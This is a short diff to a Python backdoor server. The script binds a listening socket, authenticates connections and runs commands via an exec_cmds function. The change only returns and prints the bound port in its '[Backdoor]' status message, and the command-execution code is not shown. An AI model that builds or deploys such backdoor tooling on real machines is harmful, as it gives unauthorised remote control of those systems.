@@ -14,11 +14,11 @@ def bind_socket(port = BASE_PORT, host = HOST):
     while port < 9999:
         try:
             s.bind((host, port))
-            return True
+            return True, port
         except socket.error as msg:
             print('Bind failed. Error Code : ' + str(msg[0]) + ' Message ' + msg[1])
             port+=1
-    return False
+    return False, -1
 
 def connect():
     s.listen()
@@ -82,9 +82,9 @@ def exec_cmds(conn):
 
 while True:
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    ok = bind_socket()
+    ok, port = bind_socket()
     if ok:
-        print('[Backdoor] Socket bind complete. Waiting for connection...')
+        print(f'[Backdoor] Socket bind complete on port {port}. Waiting for connection...')
     conn = connect()
     ok = authenticate(conn)
     if not ok:
